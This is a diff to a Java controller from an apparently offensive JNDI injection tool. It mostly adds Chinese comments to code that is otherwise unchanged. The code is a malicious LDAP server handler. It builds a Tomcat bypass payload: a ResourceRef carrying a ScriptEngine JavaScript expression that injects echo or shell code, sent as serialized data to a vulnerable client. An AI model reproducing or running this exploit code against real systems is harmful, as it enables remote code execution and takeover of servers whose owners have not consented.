@@ -3,6 +3,7 @@ package com.nu1r.jndi.controllers;
 import com.nu1r.jndi.enumtypes.GadgetType;
 import com.nu1r.jndi.enumtypes.PayloadType;
 import com.nu1r.jndi.exceptions.IncorrectParamsException;
+import com.nu1r.jndi.exceptions.UnSupportedGadgetTypeException;
 import com.nu1r.jndi.exceptions.UnSupportedPayloadTypeException;
 import com.nu1r.jndi.gadgets.utils.InjShell;
 import com.nu1r.jndi.template.*;
@@ -55,6 +56,12 @@ public class TomcatBypassController implements LdapController {
 
     public static CommandLine cmdLine;
 
+    /**
+     发送LDAP ResourceRef结果和重定向URL
+     @param result InMemoryInterceptedSearchResult类型的结果
+     @param base 基本远程参考负载字符串
+     @throws Exception 异常
+     */
     @Override
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
         try {
@@ -145,7 +152,7 @@ public class TomcatBypassController implements LdapController {
                     code = helper.injectAllEcho();
                     break;
             }
-
+            // 创建有效负载所需的字符串模板，将其中的 {replacement} 替换为上面获取到的代码
             String payloadTemplate = "{" +
                     "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
                     ".newInstance().getEngineByName(\"JavaScript\")" +
@@ -154,7 +161,7 @@ public class TomcatBypassController implements LdapController {
             String finalPayload = payloadTemplate.replace("{replacement}", code);
             ref.add(new StringRefAddr("x", finalPayload));
             e.addAttribute("javaSerializedData", Util.serialize(ref));
-
+            // 将条目发送至结果中，并将结果设置为成功
             result.sendSearchEntry(e);
             result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
             System.out.println();
@@ -164,21 +171,32 @@ public class TomcatBypassController implements LdapController {
         }
     }
 
+    /**
+     处理传入的参数 base
+     @param base 传入的参数
+     @throws UnSupportedPayloadTypeException 不支持的载荷类型异常
+     @throws IncorrectParamsException 错误的参数异常
+     @throws UnSupportedGadgetTypeException 不支持的 Gadget 类型异常
+     */
     @Override
     public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
         try {
+            // 获取第一个斜杠的索引
             int fistIndex   = base.indexOf("/");
+            // 获取第二个斜杠的索引
             int secondIndex = base.indexOf("/", fistIndex + 1);
             if (secondIndex < 0) secondIndex = base.length();
 
             try {
+                // 将类型值设为从第二个斜杠后的字符串到第三个斜杠前（不包括第三个斜杠）所表示的字符串转换为 PayloadType 枚举类型
                 payloadType = PayloadType.valueOf(base.substring(fistIndex + 1, secondIndex).toLowerCase());
                 System.out.println(ansi().render("@|green [+]|@ PaylaodType >> " + payloadType));
             } catch (IllegalArgumentException e) {
                 throw new UnSupportedPayloadTypeException("UnSupportedPayloadType >> " + base.substring(fistIndex + 1, secondIndex));
             }
-
+            // 将类型值设为从第三个斜杠后的字符串到第四个斜杠前（不包括第三个斜杠）所表示的字符串转换为 PayloadType 枚举类型
             int thirdIndex = base.indexOf("/", secondIndex + 1);
+            // 如果为空则进入下面逻辑
             if (thirdIndex != -1) {
                 if (thirdIndex < 0) thirdIndex = base.length();
                 try {
